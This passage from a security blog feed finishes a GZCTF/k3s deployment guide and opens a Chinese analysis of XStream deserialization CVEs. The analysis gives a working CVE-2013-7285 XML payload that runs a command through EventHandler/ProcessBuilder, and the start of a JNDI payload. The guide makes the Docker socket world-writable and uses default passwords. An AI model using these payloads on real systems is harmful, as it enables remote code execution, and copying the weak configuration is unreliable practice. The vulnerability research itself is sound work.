class="attr">users:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">default</span></span><br><span class="line">  <span class="attr">user:</span></span><br><span class="line">    <span class="attr">client-certificate-data:</span> <span class="string">LS0tLS1...</span></span><br><span class="line">    <span class="attr">client-key-data:</span> <span class="string">LS0tLS1...</span></span><br></pre></td></tr></table></figure><p><strong>Finally</strong>,  run <code>docker-compose up -d</code> in your gzctf directory of gzpaltform vps, and visit to your vps ip then you will see the paltform has been built if the command run successfully. For example I visit to <code>http://192.168.0.100</code> and I will see below:<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/3eaa4cf77aa94f8069fccbca72781c2e.png"><br>Default username is <code>Admin</code> and password has been set in <code>docker-compose.yml</code>. For me it’s <code>123456</code>.</p><h3 id="Challenges-Deployment"><a href="#Challenges-Deployment" class="headerlink" title="Challenges Deployment"></a>Challenges Deployment</h3><p>If we want to use gz platform api to pull images and run our challenges automatically,  a standard docker container templates is required. Fortunately, official document give us two repo, the <code>GZCTF-Challenges</code> shows basic dynamic container challenge templates and the <code>W4terCTF-2023</code> has provided pre-configured images for challenges deployment.</p><p>official docker templates address: </p><ul><li><a href="https://github.com/GZTimeWalker/GZCTF-Challenges">https://github.com/GZTimeWalker/GZCTF-Challenges</a></li><li><a href="https://github.com/W4terDr0p/W4terCTF-2023">https://github.com/W4terDr0p/W4terCTF-2023</a></li></ul><p>For example,  I wanna use a web challenges like <code>Help Newnew Find Flag</code>，got the inner service port in file <code>challenges/web/help-new-new-find-flag/README.md</code><br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/2188b51907ff09f7e3ea8eb62a1eca75.png"></p><p>Then visit the packages to get the docker images url: <a href="https://github.com/orgs/W4terDr0p/packages?repo_name=W4terCTF-2023">Packages · W4terDr0p</a><br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/e3228fcec91239ea8194abf3f0725349.png"></p><p>got the docker image address and pull it:<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/0d3f8ccff5b90477e0bfd91890a42bb4.png"></p><p>Finally, set docker image url and expose port we check before .You’ll able to visit the challenge service if everything  correct.<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/d238e5ffee6a6d2eceb6d015f210a192.png"></p><p>Service will open on k3s vps, but NOTICE use <code>docker ps -a</code> can’t see the challenges container, you need to use <code>Kuboard</code>.<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/8449be01991f518ab6e12bcebd719d3c.png"></p><h2 id="Remote-deployment"><a href="#Remote-deployment" class="headerlink" title="Remote deployment"></a>Remote deployment</h2><p>Asset Topology：</p><ul><li>aaa.aaa.aaa.aaa: for GZCTF platform deployment (frontend)，OS: ubuntu 20.04</li><li>bbb.bbb.bbb.bbb : for  k3s container cluster deployment (backend) ，OS ubuntu 20.04</li></ul><h3 id="k3s-deployment"><a href="#k3s-deployment" class="headerlink" title="k3s deployment"></a>k3s deployment</h3><p><strong><code>k3s</code> installation：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">## Domestic</span><br><span class="line">curl -sfL https://rancher-mirror.rancher.cn/k3s/k3s-install.sh | INSTALL_K3S_MIRROR=cn sh -</span><br><span class="line">## Foreign</span><br><span class="line">curl -sfL https://get.k3s.io | sh -</span><br><span class="line">## check the installation</span><br><span class="line">k3s -v</span><br></pre></td></tr></table></figure><p>modify proxy config to make sure pull images successfully. File address:  <code>/etc/rancher/k3s/registries.yaml</code> </p><figure class="highlight yaml"><figcaption><span>title:"/etc/rancher/k3s/registries.yaml"</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">mirrors:</span></span><br><span class="line">  <span class="attr">&quot;docker.io&quot;:</span></span><br><span class="line">    <span class="attr">endpoint:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;https://hub.littlediary.cn&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;https://hub.xdark.top&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;https://cjie.eu.org&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;https://docker.1panel.live&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;https://docker.unsee.tech&quot;</span></span><br></pre></td></tr></table></figure><p>As same, If we want to use Kuboard, we should install <code>docker</code> and <code>docker-compose</code> first.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">## Install docker-compose</span><br><span class="line">sudo curl -L https://github.com/docker/compose/releases/download/v2.32.1/docker-compose-`uname -s`-`uname -m` -o /usr/local/bin/docker-compose</span><br><span class="line">sudo chmod +x /usr/local/bin/docker-compose</span><br><span class="line"></span><br><span class="line">## Install docker</span><br><span class="line">sudo apt install docker.io</span><br><span class="line"></span><br><span class="line">## Optional, make docker/docker-compose command don&#x27;t need sudo at the beginning anymore. </span><br><span class="line"></span><br><span class="line">## It&#x27;s troublesome to always input the password, let make it blow up :(</span><br><span class="line">sudo groupadd docker</span><br><span class="line">sudo gpasswd -a $&#123;USER&#125; docker</span><br><span class="line">sudo systemctl restart docker</span><br><span class="line">sudo chmod a+rw /var/run/docker.sock</span><br></pre></td></tr></table></figure><p>next, install <code>Kuboard</code>. Actually, Code block below just pull a docker image and  run a web container.  </p><p>Just try <code>chmod +x run_kuboard.sh &amp;&amp; ./run_kuboard.sh</code> command to  run the below shell script.</p><p>NOTICE: <code>KUBOARD_BASE_URL</code>  need to change to your own k3s vps, for me it’s <code>http://192.168.0.195</code></p><figure class="highlight shell"><figcaption><span>title:"run_kuboard.sh"</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># Run the Docker container</span></span></span><br><span class="line">docker run -d \</span><br><span class="line">  --restart=unless-stopped \</span><br><span class="line">  --name=kuboard \</span><br><span class="line">  -p 3271:80/tcp \</span><br><span class="line">  -p 10081:10081/tcp \</span><br><span class="line">  -e KUBOARD_ENDPOINT=&quot;bbb.bbb.bbb.bbb:3271&quot; \</span><br><span class="line">  -e KUBOARD_AGENT_SERVER_TCP_PORT=&quot;10081&quot; \</span><br><span class="line">  -v /root/kuboard-data:/data \</span><br><span class="line">  swr.cn-east-2.myhuaweicloud.com/kuboard/kuboard:v3</span><br></pre></td></tr></table></figure><p>then visit address: <a href="http://bbb.bbb.bbb.bbb:3271/">http://bbb.bbb.bbb.bbb:3271</a> to see kuboard login page: （count: <code>admin/Kuboard123</code>）<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/20250402190237.png"></p><p>Then we add a cluster to bound to k3s, and set ServerApi to ensure gzctf-frontend could access backend.</p><p><strong>NOTICE</strong>: <code>kubeconfig</code> completely copy the content of <code>/etc/rancher/k3s/k3s.yaml</code>, and ApiServer should change ip to public ip like <code>https://bbb.bbb.bbb.bbb:6443</code><br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/20250402190341.png"></p><p>finally, chose you user role like below:<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/300acf6ff7cd24d76663e894b85d1b43.png"></p><h3 id="gzctf-deployment"><a href="#gzctf-deployment" class="headerlink" title="gzctf deployment"></a>gzctf deployment</h3><p>As we know, we need three file to build a frontend: <code>docker-compose.yml</code>, <code>appsettings.json</code>, <code>kube-config.yaml</code> .</p><figure class="highlight yml"><figcaption><span>title:"docker-compose.yml"</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">gzctf:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">registry.cn-shanghai.aliyuncs.com/gztime/gzctf:latest</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;GZCTF_ADMIN_PASSWORD=123456&quot;</span></span><br><span class="line">      <span class="comment">## choose your backend language `en_US` / `zh_CN` / `ja_JP`</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;LC_ALL=zh_CN.UTF-8&quot;</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;80:8080&quot;</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;./data/files:/app/files&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;./appsettings.json:/app/appsettings.json:ro&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;./kube-config.yaml:/app/kube-config.yaml:ro&quot;</span> <span class="comment">## this is required for k8s deployment</span></span><br><span class="line">      <span class="comment">## - &quot;/var/run/docker.sock:/var/run/docker.sock&quot; ## this is required for docker deployment</span></span><br><span class="line">    <span class="attr">depends_on:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">db</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">cache</span></span><br><span class="line">  <span class="attr">cache:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">redis:alpine</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">db:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">postgres:alpine</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;POSTGRES_PASSWORD=password_here&quot;</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;./data/db:/var/lib/postgresql/data&quot;</span></span><br></pre></td></tr></table></figure><p>NOTICE: change PublicEntry to backend server ip: <code>&quot;PublicEntry&quot;: &quot;bbb.bbb.bbb.bbb&quot;</code></p><figure class="highlight json"><figcaption><span>title:"appsettings.json"</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;AllowedHosts&quot;</span><span class="punctuation">:</span> <span class="string">&quot;*&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;ConnectionStrings&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;Database&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Host=db:5432;Database=gzctf;Username=postgres;Password=password_here&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;EmailConfig&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;SenderAddress&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;SenderName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;UserName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Password&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Smtp&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Host&quot;</span><span class="punctuation">:</span> <span class="string">&quot;localhost&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Port&quot;</span><span class="punctuation">:</span> <span class="number">587</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;XorKey&quot;</span><span class="punctuation">:</span> <span class="string">&quot;JasperSecretKey&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;ContainerProvider&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;Type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Kubernetes&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;PortMappingType&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Default&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;EnableTrafficCapture&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;PublicEntry&quot;</span><span class="punctuation">:</span> <span class="string">&quot;bbb.bbb.bbb.bbb&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;DockerConfig&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;SwarmMode&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Uri&quot;</span><span class="punctuation">:</span> <span class="string">&quot;unix:///var/run/docker.sock&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;RequestLogging&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;DisableRateLimit&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>NOTICE: change server to <code>https://&lt;backend_server_ip&gt;:6443</code></p><figure class="highlight yaml"><figcaption><span>title:"kube-config.yaml"</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">clusters:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">cluster:</span></span><br><span class="line">    <span class="attr">certificate-authority-data:</span> <span class="string">LS0tLS1...</span></span><br><span class="line">    <span class="attr">server:</span> <span class="string">https://bbb.bbb.bbb.bbb:6443</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">default</span></span><br><span class="line"><span class="attr">contexts:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">context:</span></span><br><span class="line">    <span class="attr">cluster:</span> <span class="string">default</span></span><br><span class="line">    <span class="attr">user:</span> <span class="string">default</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">default</span></span><br><span class="line"><span class="attr">current-context:</span> <span class="string">default</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Config</span></span><br><span class="line"><span class="attr">preferences:</span> &#123;&#125;</span><br><span class="line"><span class="attr">users:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">default</span></span><br><span class="line">  <span class="attr">user:</span></span><br><span class="line">    <span class="attr">client-certificate-data:</span> <span class="string">LS0tLS1...</span></span><br><span class="line">    <span class="attr">client-key-data:</span> <span class="string">LS0tLS1...</span></span><br></pre></td></tr></table></figure><p>Create the above config file properly, then run command <code>docker-compose up -d</code><br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/c20904e59b692b098f60feb1cbe5aaa5.png"></p><p>Try visit <a href="http://aaa.aaa.aaa.aaa/">http://aaa.aaa.aaa.aaa</a>, you will see the platform:<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/20250402190500.png"></p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://xz.aliyun.com/t/15072">https://xz.aliyun.com/t/15072</a></li><li><a href="https://xieweiling.top/blog/2024/09/25/GZCTF/">https://xieweiling.top/blog/2024/09/25/GZCTF/</a></li><li><a href="https://gzctf.gzti.me/zh/guide/start/quick-start.html">https://gzctf.gzti.me/zh/guide/start/quick-start.html</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt; &lt;a href=&quot;https://xmcve.com/&quot;&gt;星盟安全团队&lt;/a&gt;长期招新中~ 我们的目标是星辰大海！ &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;简历格式：ID、联系方式、掌握技术、比赛情况&lt;/li&gt;
&lt;li&gt;简历投递邮箱： &lt;a href=&quot;mailto:&amp;#x78;&amp;#</summary>
      
    
    
    
    
    <category term="Docker" scheme="https://jaspersec.top/tags/Docker/"/>
    
    <category term="CTF" scheme="https://jaspersec.top/tags/CTF/"/>
    
    <category term="k3s" scheme="https://jaspersec.top/tags/k3s/"/>
    
  </entry>
  
  <entry>
    <title>XStream 反序列化</title>
    <link href="https://jaspersec.top/posts/1342605474.html"/>
    <id>https://jaspersec.top/posts/1342605474.html</id>
    <published>2025-01-01T09:00:00.000Z</published>
    <updated>2025-03-31T22:09:47.240Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>XStream 是一个将 java bean 对象与 xml 互相转换的依赖包，有点类似 fastjson 的 json 对象互转。</p><p>对于原生的 Java 反序列化来说，可以利用的 Java 类是任意实现了<code>Serializable</code>的类，入口是<code>ObjectInputStream</code>的<code>readObject</code>方法。对于<code>XStream</code>来说，可以利用的Java是任意类，入口是<code>XStream</code>的<code>fromXML</code>方法。</p><p>Xstream 会把 CVE 的 payload公布出来： <a href="https://x-stream.github.io/security.html">https://x-stream.github.io/security.html</a> ，可以看到 1.4.17 之后漏洞变少很多，因为由黑名单转向白名单了。</p><h2 id="sorted-set"><a href="#sorted-set" class="headerlink" title="sorted-set"></a>sorted-set</h2><h3 id="CVE-2013-7285"><a href="#CVE-2013-7285" class="headerlink" title="CVE-2013-7285"></a>CVE-2013-7285</h3><h4 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h4><p>XStream &#x3D;&#x3D;  1.4.5 &#x2F;1.4.6 &#x2F; 1.4.10</p><h4 id="版本说明"><a href="#版本说明" class="headerlink" title="版本说明"></a>版本说明</h4><p>&lt;&#x3D; 1.3.1 版本不解析 sorted-set 标签，无法利用。</p><p>&lt; 1.4.4 的版本会判断 treeMap 是否为空，为空不进 populateTreeMap，链子断掉。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/f8e2d98965ca74a311efa3fba3ca76c1.png"></p><p>1.4.7 - 1.4.9 、1.4.11 都是对  EventHandler 这个类进行黑名单过滤。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/f75b85c7b09acb4f7610125b335abfda.png"></p><h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>漏洞本质：<code>&lt;dynamic-proxy&gt;</code> 这个标签在转换成对象时，会把<code>&lt;handler&gt;</code>指定的类作为 handler， 并封装一个对应的动态代理对象。当 <code>&lt;interface&gt;</code> 指定的类的方法被执行时，触发 handler 的 invoke，通过配置<code>&lt;target&gt;</code> 指定触发的类和 <code>&lt;command&gt;</code> 指定参数实现 RCE。</p><figure class="highlight xml"><figcaption><span>title:"poc.xml"</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--affected_version: XStream ==  1.4.5 /1.4.6 / 1.4.10--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">sorted-set</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">interface</span>&gt;</span>java.lang.Comparable<span class="tag">&lt;/<span class="name">interface</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">handler</span> <span class="attr">class</span>=<span class="string">&quot;java.beans.EventHandler&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">target</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">command</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">string</span>&gt;</span>calc<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">command</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">action</span>&gt;</span>start<span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">handler</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">sorted-set</span>&gt;</span></span><br></pre></td></tr></table></figure><p>函数调用栈</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">invoke:275, MethodUtil (sun.reflect.misc)</span><br><span class="line">invokeInternal:482, EventHandler (java.beans)</span><br><span class="line">access$000:279, EventHandler (java.beans)</span><br><span class="line">run:430, EventHandler$1 (java.beans)</span><br><span class="line">doPrivileged:-1, AccessController (java.security)</span><br><span class="line">invoke:428, EventHandler (java.beans)</span><br><span class="line">compareTo:-1, $Proxy0 (com.sun.proxy)</span><br><span class="line">compare:1290, TreeMap (java.util)</span><br><span class="line">put:538, TreeMap (java.util)</span><br><span class="line">putAll:281, AbstractMap (java.util)</span><br><span class="line">putAll:327, TreeMap (java.util)</span><br><span class="line">populateTreeMap:122, TreeMapConverter (com.thoughtworks.xstream.converters.collections)</span><br><span class="line">unmarshal:94, TreeSetConverter (com.thoughtworks.xstream.converters.collections)</span><br><span class="line">convert:72, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convert:65, AbstractReferenceUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convertAnother:66, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convertAnother:50, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">start:134, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">unmarshal:32, AbstractTreeMarshallingStrategy (com.thoughtworks.xstream.core)</span><br><span class="line">unmarshal:1156, XStream (com.thoughtworks.xstream)</span><br><span class="line">unmarshal:1140, XStream (com.thoughtworks.xstream)</span><br><span class="line">fromXML:1020, XStream (com.thoughtworks.xstream)</span><br><span class="line">main:20, Exp (CVE_2013_7285)</span><br></pre></td></tr></table></figure><p>source点: <code>k1.compareTo(k2)</code> 触发反序列化，原因是代理对象k1调用了 java.lang.Comparable#compareTo 方法，触发了 <code>&lt;dynamic-proxy&gt;</code> ， 然后进入 EventHandler#invoke 的逻辑实现 RCE。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/5770faa367e535eb5c7e286be7a5c6a9.png"></p><p>下图位置打个条件断点，一目了然。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/22076a51d04ea1fd0e10e12381f621bb.png"></p><h3 id="CVE-2021-21351"><a href="#CVE-2021-21351" class="headerlink" title="CVE-2021-21351"></a>CVE-2021-21351</h3><h4 id="影响范围-1"><a href="#影响范围-1" class="headerlink" title="影响范围"></a>影响范围</h4><p>XStream &lt;&#x3D; 1.4.15</p><p>JDK &lt; 8u121（使用 RMI 进行 JNDI ）</p><p>JDK &lt; 8u191（使用 LADP 进行 JNDI ）</p><h4 id="版本说明-1"><a href="#版本说明-1" class="headerlink" title="版本说明"></a>版本说明</h4><p>无</p><h4 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>漏洞本质：source 点<code>javax.naming.ldap.Rdn.RdnEntry#compareTo</code>，和上面一样通过 <code>&lt;sorted-set&gt;</code> 触发，sink 点就是 <code>com.sun.rowset.JdbcRowSetImpl#connect</code>，即 JdbcRowSetImpl 链 触发 JNDI。</p><figure class="highlight xml"><figcaption><span>title:"poc.xml"</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">sorted-set</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">type</span>&gt;</span>ysomap<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span> <span class="attr">class</span>=<span 